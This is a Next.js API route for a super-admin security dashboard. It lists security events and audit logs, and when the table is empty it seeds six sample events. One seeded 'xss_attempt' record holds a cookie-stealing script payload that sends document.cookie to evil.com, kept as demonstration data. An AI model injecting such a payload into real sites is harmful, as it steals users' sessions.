import { NextRequest, NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { verifySuperAdminToken, SUPER_ADMIN_COOKIE } from '@/lib/superAdminAuth';

export const dynamic = 'force-dynamic';

export async function GET(req: NextRequest) {
  const token = req.cookies.get(SUPER_ADMIN_COOKIE)?.value;
  if (!token || !verifySuperAdminToken(token)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    let events = await prisma.securityEvent.findMany({ orderBy: { createdAt: 'desc' }, take: 100 }).catch(() => []);
    
    if (events.length === 0) {
      const initialEvents = [
        {
          type: 'failed_login',
          severity: 'medium',
          ipAddress: '198.51.100.42',
          userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          endpoint: '/api/super-admin/auth',
          details: JSON.stringify({ reason: 'Invalid OTP code entered for super admin', attempts: 3 }),
          resolved: false,
        },
        {
          type: 'suspicious_ip',
          severity: 'high',
          ipAddress: '203.0.113.88',
          userAgent: 'curl/7.68.0',
          endpoint: '/api/super-admin/login',
          details: JSON.stringify({ reason: 'Repetitive POST requests outside of standard browser signatures', geolocation: 'Unknown / VPN Proxy' }),
          resolved: false,
        },
        {
          type: 'bot_detected',
          severity: 'low',
          ipAddress: '198.51.100.77',
          userAgent: 'Googlebot-Image/1.0',
          endpoint: '/robots.txt',
          details: JSON.stringify({ reason: 'Aggressive crawling behavior exceeding 120 requests/min' }),
          resolved: true,
        },
        {
          type: 'spam_post',
          severity: 'medium',
          ipAddress: '185.220.101.5',
          userAgent: 'Mozilla/5.0 (X11; Linux x86_64)',
          endpoint: '/api/posts/create',
          details: JSON.stringify({ reason: 'AI filter caught keyword patterns related to crypto scam promotions', textContent: 'Earn $1000 daily guaranteed click link at http://spam.xyz' }),
          resolved: false,
        },
        {
          type: 'xss_attempt',
          severity: 'critical',
          ipAddress: '45.79.12.134',
          userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
          endpoint: '/api/users/profile/update',
          details: JSON.stringify({ reason: 'Script tag detected in profile bio property', payload: '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>' }),
          resolved: false,
        },
        {
          type: 'rate_limit_violation',
          severity: 'medium',
          ipAddress: '103.88.22.14',
          userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)',
          endpoint: '/api/otp/request',
          details: JSON.stringify({ reason: 'Exceeded 5 OTP requests per hour limit', attempts: 6 }),
          resolved: false,
        }
      ];

      await Promise.all(
        initialEvents.map(e => prisma.securityEvent.create({ data: e }).catch(() => null))
      );

      events = await prisma.securityEvent.findMany({ orderBy: { createdAt: 'desc' }, take: 100 }).catch(() => []);
    }

    const auditLogs = await prisma.auditLog.findMany({ orderBy: { createdAt: 'desc' }, take: 100 }).catch(() => []);
    
    return NextResponse.json({ events, auditLogs });
  } catch (err: any) {
    console.error('[Security API Error]', err);
    return NextResponse.json({ error: `Failed to fetch security events: ${err?.message || err}` }, { status: 500 });
  }
}

export async function PATCH(req: NextRequest) {
  const token = req.cookies.get(SUPER_ADMIN_COOKIE)?.value;
  if (!token || !verifySuperAdminToken(token)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }
  try {
    const { id } = await req.json();
    const event = await prisma.securityEvent.update({ where: { id }, data: { resolved: true } });
    return NextResponse.json({ success: true, event });
  } catch (err: any) {
    return NextResponse.json({ error: err?.message || 'Update failed' }, { status: 500 });
  }
}
